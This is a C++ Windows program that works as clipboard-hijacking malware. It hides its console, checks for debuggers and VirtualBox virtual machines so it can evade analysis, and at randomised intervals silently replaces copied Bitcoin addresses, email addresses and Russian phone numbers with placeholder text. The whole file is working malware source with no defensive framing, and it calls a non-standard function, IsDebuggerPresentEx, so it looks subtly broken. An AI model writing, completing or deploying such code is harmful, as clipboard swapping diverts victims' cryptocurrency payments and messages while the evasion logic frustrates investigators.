#include <windows.h>
#include <iostream>
#include <string>
#include <regex>
#include <thread>
#include <chrono>
#include <vector>
#include <random>

// Function to replace clipboard content
bool ReplaceClipboard(const std::wstring& newText) {
    if (!OpenClipboard(nullptr)) {
        std::cerr << "Failed to open clipboard" << std::endl;
        return false;
    }

    EmptyClipboard();

    // Allocate global memory for the new text
    HGLOBAL hMem = GlobalAlloc(GMEM_MOVEABLE, (newText.length() + 1) * sizeof(wchar_t));

    if (hMem == nullptr) {
        CloseClipboard();
        std::cerr << "Failed to allocate memory for clipboard data" << std::endl;
        return false;
    }

    wchar_t* clipData = static_cast<wchar_t*>(GlobalLock(hMem));

    if (clipData == nullptr) {
        GlobalFree(hMem);
        CloseClipboard();
        std::cerr << "Failed to lock clipboard memory" << std::endl;
        return false;
    }

    // Copy the new text into the allocated memory
    wcscpy_s(clipData, newText.length() + 1, newText.c_str());

    GlobalUnlock(hMem);

    // Set the new clipboard data
    SetClipboardData(CF_UNICODETEXT, hMem);

    CloseClipboard();
    return true;
}

// Function to retrieve clipboard content
std::wstring GetClipboardContent() {
    if (!OpenClipboard(nullptr)) {
        return L"";
    }

    HANDLE hData = GetClipboardData(CF_UNICODETEXT);
    if (hData == nullptr) {
        CloseClipboard();
        return L"";
    }

    wchar_t* pszText = static_cast<wchar_t*>(GlobalLock(hData));
    if (pszText == nullptr) {
        CloseClipboard();
        return L"";
    }

    std::wstring clipboardText(pszText);
    GlobalUnlock(hData);
    CloseClipboard();

    return clipboardText;
}

// Function to check if debugger is attached
bool IsDebuggerAttached() {
    BOOL isDebuggerPresent = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebuggerPresent);
    return isDebuggerPresent == TRUE;
}

// Function to check for virtual machine environment
bool IsVirtualMachine() {
    const std::vector<std::string> vmIndicators = {
        "SYSTEM\\ControlSet001\\Services\\Disk\\Enum",
        "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        "SYSTEM\\ControlSet001\\Services\\VBoxMouse",
        "SYSTEM\\ControlSet001\\Services\\VBoxService",
        "SYSTEM\\ControlSet001\\Services\\VBoxSF",
        "SYSTEM\\ControlSet001\\Services\\VBoxVideo",
        "HARDWARE\\ACPI\\DSDT\\VBOX__",
        "HARDWARE\\ACPI\\FADT\\VBOX__",
        "HARDWARE\\ACPI\\RSDT\\VBOX__",
        "HARDWARE\\ACPI\\SSDT\\VBOX__",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions"
    };

    for (const auto& key : vmIndicators) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
    }

    return false;
}

// Function to implement anti-debugging techniques
void AntiDebug() {
    while (true) {
        if (IsDebuggerAttached() || IsVirtualMachine() || IsDebuggerPresent() || IsDebuggerPresentEx(0)) {
            std::cerr << "Debugger or virtual machine detected! Exiting..." << std::endl;
            ExitProcess(1);
        }
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
}

// Function to monitor clipboard content and replace as necessary
void MonitorClipboard() {
    std::wstring lastClipboardContent = L"";

    while (true) {
        std::wstring clipboardText = GetClipboardContent();

        if (!clipboardText.empty() && clipboardText != lastClipboardContent) {
            if (std::regex_match(clipboardText, std::wregex(L"^[13][a-zA-Z0-9]{25,34}$"))) {
                std::wstring replaceText = L"REPLACE_TEXT_FOR_BTC_ADDRESS"; // Replace with text for Bitcoin address
                if (ReplaceClipboard(replaceText)) {
                    std::wcout << L"Bitcoin address replaced stealthily!" << std::endl;
                }
            } else if (std::regex_match(clipboardText, std::wregex(L"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$"))) {
                std::wstring replaceText = L"REPLACE_TEXT_FOR_EMAIL_ADDRESS"; // Replace with text for email address
                if (ReplaceClipboard(replaceText)) {
                    std::wcout << L"Email address replaced stealthily!" << std::endl;
                }
            } else if (std::regex_match(clipboardText, std::wregex(L"^\\+7\\d{10}$"))) {
                std::wstring replaceText = L"REPLACE_TEXT_FOR_PHONE_NUMBER"; 
                if (ReplaceClipboard(replaceText)) {
                    std::wcout << L"Russian phone number replaced stealthily!" << std::endl;
                }
            }

            lastClipboardContent = clipboardText;
        }

        std::random_device rd {};
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(500, 2000); // Delay between 500 ms to 2000 ms
        std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));
    }
}

int main() {
    // Hide console window
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    // Start anti-debugging function
    std::thread(AntiDebug).detach();

    // Start clipboard monitoring
    MonitorClipboard();

    return 0;
}
